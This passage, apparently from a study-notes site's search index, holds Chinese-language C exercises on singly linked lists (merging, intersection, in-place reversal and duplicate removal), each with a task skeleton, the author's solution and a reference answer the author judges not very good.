\u5c06Lc\u6307\u5411La\u7684\u5934\u8282\u70b9\n    LinkList pc = *Lc;  // \u521d\u59cb\u5316\u4e00\u4e2a\u6307\u5411Lc\u5934\u8282\u70b9\u7684\u6307\u9488\n\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;elem.date &lt; pb-&gt;elem.date) {\n            pc-&gt;next = pa;  // \u5c06\u6765\u81eaLa\u7684\u8282\u70b9\u94fe\u63a5\u5230Lc\n            pa = pa-&gt;next;  // \u79fb\u52a8\u5230La\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n        }\n        else if (pa-&gt;elem.date &gt; pb-&gt;elem.date) {\n            pc-&gt;next = pb;  // \u5c06\u6765\u81eaLb\u7684\u8282\u70b9\u94fe\u63a5\u5230Lc\n            pb = pb-&gt;next;  // \u79fb\u52a8\u5230Lb\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n        }\n        else {\n            pc-&gt;next = pa;\n            pa = pa-&gt;next;  // \u79fb\u52a8\u5230La\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n            pb = pb-&gt;next;  // \u79fb\u52a8\u5230Lb\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n        }\n        pc = pc-&gt;next;  // \u79fb\u52a8\u5230Lc\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n        pc-&gt;next = NULL;\n    }\n\n    // \u5982\u679cLa\u6216Lb\u4e2d\u8fd8\u6709\u5269\u4f59\u7684\u8282\u70b9\uff0c\u5c06\u5b83\u4eec\u94fe\u63a5\u5230Lc\u4e2d\n    pc-&gt;next = pa ? pa : pb;\n}\n\n// \u8f93\u51fa\u6570\u636e\nvoid print_LinkList(LinkList L) {\n    LinkList p = L-&gt;next; // \u4ece\u7b2c\u4e00\u4e2a\u8282\u70b9\u5f00\u59cb\n    while (p) {\n        printf(\"%d \", p-&gt;elem.date); // \u6253\u5370\u6570\u636e\n        p = p-&gt;next; // \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u8282\u70b9\n    }\n    printf(\"\\n\");\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_31","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;      // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c %d \u4e2a\u5143\u7d20\u662f: \", i + 1); // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%2d\", &amp;p-&gt;elem.date);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid MergeList(LinkList La, LinkList Lb, LinkList* Lc) {\n    // \u5408\u5e76\u94fe\u8868La\u548cLb\uff0c\u5408\u5e76\u540e\u7684\u65b0\u8868\u4f7f\u7528\u5934\u6307\u9488Lc\u6307\u5411\n    LinkList pa = La-&gt;next;\n    LinkList pb = Lb-&gt;next;\n    // pa\u548cpb\u5206\u522b\u662f\u94fe\u8868La\u548cLb\u7684\u5de5\u4f5c\u6307\u9488,\u521d\u59cb\u5316\u4e3a\u76f8\u5e94\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\n    LinkList pc;\n    *Lc = pc = La; // \u7528La\u7684\u5934\u7ed3\u70b9\u4f5c\u4e3aLc\u7684\u5934\u7ed3\u70b9\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;elem.date &lt; pb-&gt;elem.date) {\n            // \u53d6\u8f83\u5c0f\u8005La\u4e2d\u7684\u5143\u7d20\uff0c\u5c06pa\u94fe\u63a5\u5728pc\u7684\u540e\u9762\uff0cpa\u6307\u9488\u540e\u79fb\n            pc-&gt;next = pa;\n            pc = pa;\n            pa = pa-&gt;next;\n        }\n        else if (pa-&gt;elem.date &gt; pb-&gt;elem.date) {\n            // \u53d6\u8f83\u5c0f\u8005Lb\u4e2d\u7684\u5143\u7d20\uff0c\u5c06pb\u94fe\u63a5\u5728pc\u7684\u540e\u9762\uff0cpb\u6307\u9488\u540e\u79fb\n            pc-&gt;next = pb;\n            pc = pb;\n            pb = pb-&gt;next;\n        }\n        else {\n            // \u76f8\u7b49\u65f6\u53d6La\u4e2d\u7684\u5143\u7d20\uff0c\u5220\u9664Lb\u4e2d\u7684\u5143\u7d20\n            pc-&gt;next = pa;\n            pc = pa;\n            pa = pa-&gt;next;\n            LinkList q = pb-&gt;next;\n            free(pb);\n            pb = q;\n        }\n    }\n    pc-&gt;next = pa ? pa : pb; // \u63d2\u5165\u5269\u4f59\u6bb5\n    free(Lb);               // \u91ca\u653eLb\u7684\u5934\u7ed3\u70b9\n}\n\n// \u8f93\u51fa\u6570\u636e\nvoid print_LinkList(LinkList L) {\n    LinkList p = L;\n    p = L-&gt;next;\n    while (p) {\n        printf(\"%d\", p-&gt;elem.date);\n        p = p-&gt;next;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_32","title":"\u4e24\u4e2a\u94fe\u8868\u7684\u4ea4\u96c6","text":"<p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u5df2\u77e5\u4e24\u4e2a\u94fe\u8868 A \u548c B \u5206\u522b\u8868\u793a\u4e24\u4e2a\u96c6\u5408\uff0c\u5176\u5143\u7d20\u9012\u589e\u6392\u5217\u3002\u8bf7\u8bbe\u8ba1\u4e00\u4e2a\u7b97\u6cd5\uff0c\u7528\u4e8e\u6c42\u51fa A \u4e0e B \u7684\u4ea4\u96c6\uff0c\u5e76\u5b58\u653e\u4e8e A \u94fe\u8868\u4e2d\u3002(\u8fd9\u9898\u8bf4\u9519\u4e86\uff0c\u5e94\u8be5\u662f\u5b58\u653e\u4e8e C \u94fe\u8868\u4e2d)</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>/* \u521b\u5efa\u94fe\u8868\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u521b\u5efa\u94fe\u8868 L\uff0c\u94fe\u8868\u7684\u957f\u5ea6\u4e3a n */\nvoid Create_LinkList(LinkList *L, int n)\n\n/* \u6c42\u51fa\u4ea4\u96c6\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u6c42\u51fa\u4e24\u4e2a\u94fe\u8868 La \u548c Lb \u7684\u4ea4\u96c6 Lc */\nvoid Mix(LinkList *La, LinkList *Lb, LinkList *Lc)\n\n/* \u8f93\u51fa\u6570\u636e\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5c06\u94fe\u8868 L \u7684\u6570\u636e\u8f93\u51fa */\nvoid print_LinkList(LinkList L)\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>3,3\uff08\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n4\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n5\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5408\u5e76\u540e\u7684\u94fe\u8868\u4e3a: 3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_33","title":"\u9898\u76ee\uff1a","text":"<p>\u8fd9\u9053\u9898\u91cc\u9762\u53ef\u80fd\u6307\u9488\u7684\u64cd\u4f5c\u6709\u4e00\u70b9\u70b9\u2026\u2026</p> <p>\u6bd4\u5982<code>*L = (LinkList)malloc(sizeof(LNode));</code> \u548c<code>(*L)-&gt;next = NULL;</code></p> <p>\u53cc\u91cd\u6307\u9488\uff0c\u6b64\u65f6\u7684L\u662f<code>Node**</code>\uff0c\u6240\u4ee5\u5c31\u5148\u89e3\u5f00\u4e00\u5c42\uff0c\u5bf9<code>Node*</code>\u64cd\u4f5c\uff08<code>*L</code>\u7c7b\u578b\u662f<code>Node*</code>\uff09</p> Text Only<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid print_LinkList(LinkList L) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Mix(LinkList *La, LinkList *Lb, LinkList *Lc) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    // \u521b\u5efa2\u4e2a\u94fe\u8868\n    LinkList La, Lb, Lc;\n    // \u8f93\u5165\u6570\u636e\n    int sum01, sum02;\n    printf(\"\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5206\u522b\u4e3a: \");\n    scanf(\"%d,%d\", &amp;sum01, &amp;sum02); // \u8f93\u5165\u4ee5\u82f1\u6587\u9017\u53f7\u5206\u9694\u5f00\n    printf(\"\u8bf7\u8f93\u5165\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    Create_LinkList(&amp;La, sum01);\n    printf(\"\u8bf7\u8f93\u5165\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    Create_LinkList(&amp;Lb, sum02);\n\n    Mix(&amp;La, &amp;Lb, &amp;Lc);\n    printf(\"\\n\u5408\u5e76\u540e\u7684\u94fe\u8868\u4e3a: \");\n    print_LinkList(Lc);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_34","title":"\u7b54\u6848\uff1a","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n    LinkList p = *L;\n\n    //printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    for (int i = 0; i &lt; n; i++) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        scanf(\"%d\", &amp;(newNode-&gt;data));\n        newNode-&gt;next = NULL;\n        p-&gt;next = newNode;\n        p = p-&gt;next;\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList p = L-&gt;next;\n    while (p != NULL) {\n        printf(\"%d \", p-&gt;data);\n        p = p-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\nvoid Mix(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pa = (*La)-&gt;next;\n    LinkList pb = (*Lb)-&gt;next;\n    LinkList pc = (LinkList)malloc(sizeof(LNode));\n    pc-&gt;next = NULL;\n    *Lc = pc;\n\n    while (pa != NULL &amp;&amp; pb != NULL) {\n        if (pa-&gt;data &lt; pb-&gt;data) {\n            pa = pa-&gt;next;\n        }\n        else if (pa-&gt;data &gt; pb-&gt;data) {\n            pb = pb-&gt;next;\n        }\n        else {\n            LinkList newNode = (LinkList)malloc(sizeof(LNode));\n            newNode-&gt;data = pa-&gt;data;\n            newNode-&gt;next = NULL;\n            pc-&gt;next = newNode;\n            pc = pc-&gt;next;\n            pa = pa-&gt;next;\n            pb = pb-&gt;next;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_35","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;     // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c %d \u4e2a\u5143\u7d20\u662f: \", i + 1); // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;p-&gt;data);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next; // \u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d\", p-&gt;data);\n    }\n}\n\nvoid Mix(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pa = (*La)-&gt;next;\n    LinkList pb = (*Lb)-&gt;next;\n    // pa\u548cpb\u5206\u522b\u662f\u94fe\u8868La\u548cLb\u7684\u5de5\u4f5c\u6307\u9488,\u521d\u59cb\u5316\u4e3a\u76f8\u5e94\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\n    LinkList pc;\n    *Lc = pc = *La; // \u7528La\u7684\u5934\u7ed3\u70b9\u4f5c\u4e3aLc\u7684\u5934\u7ed3\u70b9\n    while (pa &amp;&amp; pb) {\n        LinkList u;\n        if (pa-&gt;data == pb-&gt;data) {\n            // \u4ea4\u96c6\u5e76\u5165\u7ed3\u679c\u8868\u4e2d\n            pc-&gt;next = pa;\n            pc = pa;\n            pa = pa-&gt;next;\n            u = pb;\n            pb = pb-&gt;next;\n            free(u);\n        }\n        else if (pa-&gt;data &lt; pb-&gt;data) {\n            u = pa;\n            pa = pa-&gt;next;\n            free(u);\n        }\n        else {\n            u = pb;\n            pb = pb-&gt;next;\n            free(u);\n        }\n    }\n    while (pa) {\n        LinkList u = pa;\n        pa = pa-&gt;next;\n        free(u);\n    } // \u91ca\u653e\u7ed3\u70b9\u7a7a\u95f4\n    while (pb) {\n        LinkList u = pb;\n        pb = pb-&gt;next;\n        free(u);\n    }                // \u91ca\u653e\u7ed3\u70b9\u7a7a\u95f4\n    pc-&gt;next = NULL; // \u7f6e\u94fe\u8868\u5c3e\u6807\u8bb0\u3002\n    free(*Lb);       // \u91ca\u653eLb\u7684\u5934\u7ed3\u70b9\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_36","title":"\u94fe\u63a5\u65b9\u5411\u9006\u8f6c","text":"<p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bbe\u8ba1\u4e00\u4e2a\u7b97\u6cd5\uff0c\u5c06\u94fe\u8868\u4e2d\u6240\u6709\u7ed3\u70b9\u7684\u94fe\u63a5\u65b9\u5411\u201c\u539f\u5730\u201d\u9006\u8f6c\uff0c\u5373\u8981\u6c42\u4ec5\u5229\u7528\u539f\u8868\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u8981\u6c42\u7b97\u6cd5\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a O(1)\u3002</p> <p>\u8f93\u5165</p> Text Only<pre><code>3\uff08\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n3\uff08\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5355\u94fe\u8868\u9006\u7f6e\u4e4b\u540e\u7684\u5f62\u5f0f:\n321\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_37","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;malloc.h&gt;\n\ntypedef struct node {\n    char element[10];\n    struct node *next;\n} LinkList;\n\nLinkList *Creat_LinkList (int n) {\n    //\u521b\u5efa\u94fe\u8868\n\n}\n\nvoid print_LinkList (LinkList *p) {\n    //\u8f93\u51fa\u94fe\u8868\n\n}\n\nvoid reverse (LinkList *p) {\n    //\u94fe\u8868\u9006\u7f6e\n\n}\n\nint main () {\n    //\u6839\u636e\u9898\u610f\uff0c\u5b8c\u6210\u7a0b\u5e8f\n\n    LinkList *L;\n    int count; //\u8bbe\u7f6e\u5355\u94fe\u8868\u4e2d\u5143\u7d20\u4e2a\u6570\n    printf(\"\u8bf7\u8f93\u5165\u5355\u94fe\u8868\u4e2d\u5143\u7d20\u4e2a\u6570: \");\n    scanf(\"%d\", &amp;count);\n    L = Creat_LinkList(count);\n    printf(\"\\n\u5355\u94fe\u8868\u9006\u7f6e\u4e4b\u524d\u7684\u5f62\u5f0f:\\n\");\n    print_LinkList(L);\n    reverse(L); //\u5355\u94fe\u8868\u9006\u7f6e\n    printf(\"\\n\u5355\u94fe\u8868\u9006\u7f6e\u4e4b\u540e\u7684\u5f62\u5f0f:\\n\");\n    print_LinkList(L);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_38","title":"\u7b54\u6848\uff1a","text":"C<pre><code>LinkList* Creat_LinkList(int n) {\n    LinkList* head = (LinkList*)malloc(sizeof(LinkList));\n    head-&gt;next = NULL;\n    LinkList* p = head;\n\n    for (int i = 0; i &lt; n; i++) {\n        LinkList* newNode = (LinkList*)malloc(sizeof(LinkList));\n        scanf(\"%s\", newNode-&gt;element);\n        newNode-&gt;next = NULL;\n        p-&gt;next = newNode;\n        p = p-&gt;next;\n    }\n    return head;\n}\n\nvoid print_LinkList(LinkList* p) {\n    p = p-&gt;next;\n    while (p) {\n        printf(\"%s\", p-&gt;element);\n        p = p-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\nvoid reverse(LinkList* p) {\n    LinkList* prev = NULL;\n    LinkList* current = p-&gt;next;\n    LinkList* next = NULL;\n\n    while (current != NULL) {\n        next = current-&gt;next;\n        current-&gt;next = prev;\n        prev = current;\n        current = next;\n    }\n\n    p-&gt;next = prev;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_39","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>LinkList* Creat_LinkList(int n) {\n    //\u521b\u5efa\u94fe\u8868\n    LinkList* p, * L, * q;\n    int i;\n    if ((L = (LinkList*)malloc(sizeof(LinkList))) == NULL) {\n        exit(0); //\u521b\u5efa\u5934\u7ed3\u70b9\u5f02\u5e38\uff0c\u6b63\u5e38\u8fd0\u884c\u7a0b\u5e8f\u5e76\u9000\u51fa\n    }\n    L-&gt;element[0] = '\\0'; //\u521b\u5efa\u5934\u7ed3\u70b9\n    L-&gt;next = NULL;       //\u521b\u5efa\u7a7a\u94fe\u8868\n    p = L;                //p\u6307\u5411\u5934\u7ed3\u70b9\n    for (i = 0; i &lt; n; i++) {\n        if ((q = (LinkList*)malloc(sizeof(LinkList))) == NULL) {\n            exit(0); //\u521b\u5efa\u5176\u4f59\u7ed3\u70b9\u5f02\u5e38\uff0c\u5e76\u6b63\u5e38\u9000\u51fa\n        }\n        p-&gt;next = q;\n        printf(\"\u8bf7\u8f93\u5165\u7b2c %d \u4e2a\u5143\u7d20: \", i + 1); //i\u7684\u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%s\", q-&gt;element);            //%s\u4ee3\u8868\u5b57\u7b26\u4e32\u683c\u5f0f\n        q-&gt;next = NULL;\n        p = q;\n    }\n    return (L);\n}\n\nvoid print_LinkList(LinkList* p) {\n    //\u8f93\u51fa\u94fe\u8868\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next; //\u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%s\", p-&gt;element);\n    }\n}\n\nvoid reverse(LinkList* p) {\n    //\u9006\u5e8f\u8f93\u51fa\u5355\u94fe\u8868\u4e2d\u7684\u5143\u7d20\n    LinkList* x, * y, * z;\n    x = p;\n    y = p-&gt;next;\n    while (y-&gt;next != NULL) {\n        z = y-&gt;next;\n        y-&gt;next = x;\n        x = y;\n        y = z;\n    }\n    y-&gt;next = x;\n    p-&gt;next-&gt;next = NULL;\n    p-&gt;next = y;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_40","title":"\u5220\u9664\u91cd\u590d\u5143\u7d20","text":"<p>\u5df2\u77e5\u7ebf\u6027\u8868\u4e2d\u7684\u5143\u7d20\u4ee5\u503c\u975e\u9012\u51cf\u6709\u5e8f\u6392\u5217\uff0c\u5e76\u4ee5\u5355\u94fe\u8868\u4f5c\u5b58\u50a8\u7ed3\u6784\u3002\u8bd5\u5199\u4e00\u9ad8\u6548\u7684\u7b97\u6cd5\uff0c\u5220\u9664\u8868\u4e2d\u6240\u6709\u503c\u76f8\u540c\u7684\u591a\u4f59\u5143\u7d20\uff08\u4f7f\u5f97\u64cd\u4f5c\u540e\u7684\u7ebf\u6027\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u503c\u5747\u4e0d\u76f8\u540c\uff09\uff0c\u540c\u65f6\u91ca\u653e\u88ab\u5220\u7ed3\u70b9\u7a7a\u95f4\u3002</p> <p>\u8f93\u5165</p> Text Only<pre><code>3\uff08\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n2\uff08\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5220\u9664\u76f8\u5173\u5143\u7d20\u540e\u7684\u94fe\u8868\u4e3a\uff1a12\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_41","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid ListDelete_LSameNode(LinkList L) {\n    // \u5220\u9664\u94fe\u8868\u4e2d\u91cd\u590d\u5143\u7d20\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    // \u521b\u5efa\u94fe\u8868\n    LinkList L;\n\n    // \u8f93\u5165\u6570\u636e\n    int count;\n    printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff1a\");\n    scanf(\"%d\", &amp;count);\n    printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;L, count);\n    ListDelete_LSameNode(L);\n    printf(\"\u5220\u9664\u76f8\u5173\u5143\u7d20\u540e\u7684\u94fe\u8868\u4e3a\uff1a\");\n    print_LinkList(L);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_42","title":"\u7b54\u6848\uff1a","text":"<p>\u6ca1\u6709\u65b0\u4e1c\u897f\uff0c\u8fd8\u662f\u90a3\u4e9b\u6a21\u5f0f\uff0c<code>Create_LinkList</code>\u7528\u4e86\u4e8c\u91cd\u6307\u9488\uff0c\u7136\u540e\u8fd8\u6709\u7b2c\u4e00\u9898\u5c31\u51fa\u73b0\u7684\u53bb\u91cd\u64cd\u4f5c\u3002</p> C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode* next;\n} LNode, * LinkList;\n\nvoid Create_LinkList(LinkList* L, int n) {\n\n    *L = (LNode*)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n\n    LinkList p = (*L);\n\n    for (int i = 0; i &lt; n; i++) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        scanf(\"%d\", &amp;(newNode-&gt;data));\n        newNode-&gt;next = NULL;\n\n        p-&gt;next = newNode;\n        p = p-&gt;next;\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList temp = L-&gt;next;\n\n    while (temp != NULL) {\n        printf(\"%d \", temp-&gt;data);\n        temp = temp-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\nvoid ListDelete_LSameNode(LinkList L) {\n\n    LinkList temp = L;\n\n    while (temp &amp;&amp; temp-&gt;next) {\n        LinkList next = temp-&gt;next;\n        if (temp-&gt;data == next-&gt;data) {\n            temp-&gt;next = next-&gt;next;\n            free(next);\n        }\n        else {\n            temp = temp-&gt;next;\n        }\n    }\n}\n\nint main() {\n    // \u521b\u5efa\u94fe\u8868\n    LinkList L;\n\n    // \u8f93\u5165\u6570\u636e\n    int count;\n    printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff1a\");\n    scanf(\"%d\", &amp;count);\n    printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;L, count);\n    ListDelete_LSameNode(L);\n    printf(\"\u5220\u9664\u76f8\u5173\u5143\u7d20\u540e\u7684\u94fe\u8868\u4e3a\uff1a\");\n    print_LinkList(L);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_43","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;      // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c%2d\u4e2a\u5143\u7d20\u662f\uff1a\", i + 1); // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;p-&gt;data);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next; // \u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d\", p-&gt;data);\n    }\n}\n\nvoid ListDelete_LSameNode(LinkList L) {\n    // \u5220\u9664\u94fe\u8868\u4e2d\u91cd\u590d\u5143\u7d20\n    LinkList p, q, prev;\n    p = L;\n    prev = p;\n    p = p-&gt;next;\n    while (p) {\n        prev = p;\n        p = p-&gt;next;\n        if (p &amp;&amp; p-&gt;data == prev-&gt;data) {\n            prev-&gt;next = p-&gt;next;\n            q = p;\n            p = p-&gt;next;\n            free(q); 